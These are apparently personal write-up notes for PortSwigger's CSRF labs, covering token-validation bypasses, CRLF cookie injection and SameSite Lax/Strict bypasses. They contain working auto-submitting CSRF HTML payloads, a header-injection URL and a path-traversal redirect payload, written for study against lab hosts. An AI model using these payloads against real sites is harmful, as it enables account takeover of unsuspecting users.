#### Reference: [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

##### Steps:
We need to change email through CSRF, when victim clik on link

For CSRF to work follow condition must meet:
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Only seassion cookie is there 
- **No unpredictable request parameters** - In http request there is only email parameter.

Cred - `wiener:peter`

1. Change the email.

2. Look for http request where email is changed.
   
3. check the conditions.

4. Make CSRF payload or you can use burpsuite pro for this.
```
<html> 
   <body>
	   <form action="https://vulnerable-website.com/email/change" method="POST">  
		   <input type="hidden" name="email" value="pwned@evil-user.net" />
	   </form>  
	   <script>
		   document.forms[0].submit();
	   </script>
	</body>
</html>
```
5.  Put this is server and click on store and  Send it to the Victim.

6. Make sure that you change email every time you send.

7. And check all parameter such as: action:`victim email change path`, email change, method.

There you go !!!

---
---
# Bypassing CSRF token validation

#### Reference: [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

##### Steps:

Let's look for condition for CSRF to work.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

csrf parameter is there to prevent the csrf from being sussesful.

But there is one more ways.
Website strick check every parameter for csrf when method is `POST` But sometimes with `GET` Method you can achive CSRF, by changing `POST` to `GET`.

1. Change the email.

2. Look for http request where email is changed.
   
3. check the conditions, if conditions are not satify try using GET to bypass CSRF token.

4. Make CSRF payload or you can use burpsuite pro for this.
```
<html> 
   <body>
	   <form action="https://vulnerable-website.com/email/change" method="GET">  
		   <input type="hidden" name="email" value="pwned@evil-user.net" />
	   </form>  
	   <script>
		   document.forms[0].submit();
	   </script>
	</body>
</html>

```

5. Put this is server and click on store and  Send it to the Victim.

6. Make sure that you change email every time you send.

7. And check all parameter such as: action:`victim email change path`, email change, method.

There you go !!!

---


#### Reference: [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

##### Analysis:
For this lab to exploit we need to change the email.
And for changing the email 3 condition must meet.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

But In this lab when you change the email there is csrf tooken means - 3rd condition doesn't fullfil.

##### CSRF Tooken Analysis
1. As we know by previos method we can change the request method from POST to GET.

2. We can remove the CSRF tooken from the request message.
	1. This method worked in this lab, we can remove the csrf tooken and still email get change.
and send it to the victim

##### Steps:

1. we login in using `wiener:peter`.

2. first we change the email and analyse `/my-account/change-email` request message.

3. when you anaylse change-email request message you can try two thing.
	1. change the request method from POST to GET (But doesn't work).
	2. Remove the CSRF tooken, and when you send request without csrf tooken you will see that email is change without CRSF tooken.

4. Now you need to make html page which automatically change email and send it to victim.

5. Go to server expoilt and inside body poast email change form.

```
<html>
  <body>
    <div>
         <form action="https://Lab-ID.web-security-academy.net/my-account/change-email" method="POST">
             <input required type="hidden" name="email" value="teesst@test.ac">
         </form>
         <script>
             document.forms[0].submit();
		 </script>
    </div>
  </body>
</html>
```

6. Inside that payload you can see that there is no csrf value.

7. Now send it to the victim.


There you go !!!

---
#### Reference: [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

##### Analysis:
For this lab to exploit we need to change the email.
And for changing the email 3 condition must meet.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

But In this lab when you change the email there is csrf tooken means - 3rd condition doesn't fullfil.
We have two id `wiener:peter` and `carlos:montoya`
##### CSRF Tooken Analysis
1. As we know by previos method we can change the request method from POST to GET.
2. We can remove the CSRF tooken from the request message.
3. We can replace once Victim CSRF Tooken with Attacker CSRF Tooken.
	1. we can take attacker csrf tooken.
	2. Plase csrf tooken in payload.
	3. and send it to vicitm to change the email if with attacker email id.
	4. Remember - csrf tooken change after every request. attacker need to update csrf tooken every time.

##### Steps:
1. We can take carlos as attacker and wiener as victim.

2. Login as wiener and chage the email id.

3. Go to Burp and send `POST /my-account/change-email` wiener request to reapter.

4. Log in as carlos inside incognito mode.

5. Inside request message of wiener we have csrf value.
	1. We can change the request method from POST to GET (Doesn't work).
	2. We can remove the csrf tooken (Doesn't work).
	3.  Copy the CSRF value of carlos and past in wiener csrf value (It worked).

6. Now we know that by another user csrf value we can change the email id. Because seassion id is not tied to csrf.

7. Now copy the Fresh CSRF tooken and go to server exploit.

8. Inside server exploit body.
```
<html>
  <body>
    <div>
         <form action="https://Lab-ID.web-security-academy.net/my-account/change-email" method="POST">
             <input required type="hidden" name="email" value="teesst@test.ac">
             <input required type="hidden" name="csrf"  value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
         </form>
         <script>
             document.forms[0].submit();
		 </script>
    </div>
  </body>
</html>

```
8. Inside the payload change the value of csrf and email id to attacker csrf and email id.

9. Send it to the victim.

There you go !!!

---

#### Reference: [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

##### Analysis:
For this lab to exploit we need to change the email.
And for changing the email 3 condition must meet.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

But In this lab when you change the email there is csrf tooken means - 3rd condition doesn't fullfil.
We have two id `wiener:peter` and `carlos:montoya`
##### CSRF Tooken Analysis

**What do we know** - when you see the update email request header, you will see that there is one more parameter as `csrfKey=tesf...` and another parameter inside body as `csrf=sdf...`
**means** - csrf tooken is tied to csrf cookie. 

**What we can do** - 
1. Add one word to csrf tooken as see the response: `Invalid csrf tooken`.
2. Replacing csrf tooken to attaker csrf tooken and analyse response: `Invalid csrf tooken`.
3. Replacing csrf tooken and csrf Cookie to attacker csrf tooken and csrf Cookie and analyse Response: Email will change.

Conclusion: we know that csrf tooken is tied to csrf cookie and for attacking the user we need to replace csrf cooke and token.

##### Steps:
In order to exploit this vulnerability we need to perform 2 things.
1. Inject CSRF Cookie in user's session (Http Header Injection)
	
	1. First you will exlore the website and serach something and after this you will see the request and response in burp you will see that there is one more parameter(LastSearchTerm=hat) appera when you search for somthing in application.
	
	2. For injecting csrf cookie.
	
	3. In Burpsuite go to /?serach=hat requset message.
	
	4. In response message you will see `LastSearchParameter=hat`
	
	5. In request message (GET /?search=hat`%0d%0aSet-Cookie:%20csrfKey=attackercsrfcookie%3b%20SameSite=None`) send.
	
	6. In response message you get csrfKey=attackercsrfcookie.
	
	7. Sucessful.

2. Send a CSRF Attack to victim with a attacker csrf tooken.
	1.  Login as wiener and chage the email id.
	
	2. Go to Burp and send `POST /my-account/change-email` wiener request to reapter.
	
	3. Log in as carlos in private window and copy carlos csrf tooken and csrfKey cookie.
	
	4. Go to exploit server.
	
	5. Make payload.
	6. 
	   ```
	   <html>
		   <body>
			   <div>
				   <form action="https://Lab-ID.web-security-academy.net/my-account/change-email" method="POST">
		             <input required type="hidden" name="email" value="teesst@test.ac">
		             <input required type="hidden" name="csrf"  value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
		         </form>
		         <img src="https://Lab-ID.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=attackercsrfcookie%3b%20SameSite=None" onerror="document.forms[0].submit()">
			   </div>
		   </body>
	   </html>
	   ```

	7. And send it to victim.

There you go !!!

---
#### Reference: [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)


---
---
#  Bypassing SameSite cookie restrictions

#### Reference : [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

##### Analyse: 
In /account/chage-eamil you will see that there is no **CSRF** Parameter and no **samesite=Security** parameter
In /login response message you will se no **samsite**.
If victim is using chrome samesite is set to defult by lex and it's easy to by pass

##### Steps:
1. Log in as `wiener:peter`
2. Go to exploit server and inside server body past:
```
<html> 
   <body>
	   <form action="https://0ad800550369e6238026308900e40007.web-security-academy.net/my-account/change-email" method="GET">
               <input type="hidden" name="_method" value="POST">
               <input type="hidden" name="email" value="pwned@evil-user.net" />
	   </form>  
	   <script>
		   document.forms[0].submit();
	   </script>
   </body>
</html>
```
3. we have done here HTTP `_method` spoofing by add one more line: `<input type="hidden" name="_method" value="POST">`
4. Send it to victim.

There you gio !!!

---
#### Reference: [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

##### Analysis:
In this lab when you see /my-account/change-email you will see there is no csrf tooken means it's vuln to csrf but when you see /login response you will see there `samesite=strict` now we have to find a way to change email.

1. We will change the request method from POST to GET, it worked
2. If GET method is working then we can look for anyredirect so we can inject email change functionality when page get redirect.
3. You can find a redirect at comment post when you post comment it will redirect back to post.
##### Steps:
1. After conforming request method from POST to GET you can look for redirect.

2. when you post a comment you get redirect back to the post.

3. Now look in HTTPhistory look for reditect request.(`GET /post/comment/confirmation?postId=4`)

4. Inside redirect request message you see that it will redirect you to (redirectOnConfirmation('/post');)post and there is also another `<script> which point to conformcommentredirect.js</script>` which is another request messgae.

5. Inside commentConformationRedirect response you will get a js function.
	```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
	```
 6. it will redirect us to blogpath+'/'+postID
	 1. post/comment/confirmation?postId=4
	 2. how about we do pathtraversal to url/post/comment/confirmation?postId=../my-account.

7. Copy the header form the GET request of email changing(/my-account/change-email?email=wienerr%40normal-user.net&submit=1)

8. new payload `url/post/comment/confirmation?postId=../my-account/change-email?email=wiienerr%40normal-user.net&submit=1`

9. That will show missing parameter submit bcz & is not decoded in URL so &-> %26

10. payload: `url/post/comment/confirmation?postId=../my-account/change-email?email=wiienerr%40normal-user.net%26submit=1`

11. email got change succesfully.

12. Go to exploit server and make new payload.
```
<script>
windows.location = "url/post/comment/confirmation?postId=../my-account/change-email?email=wiienerr%40normal-user.net%26submit=1"
</script>
```
13. Send this to victim.

There you go !!!


---
#### Reference: [SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

Do it after web socket labs.
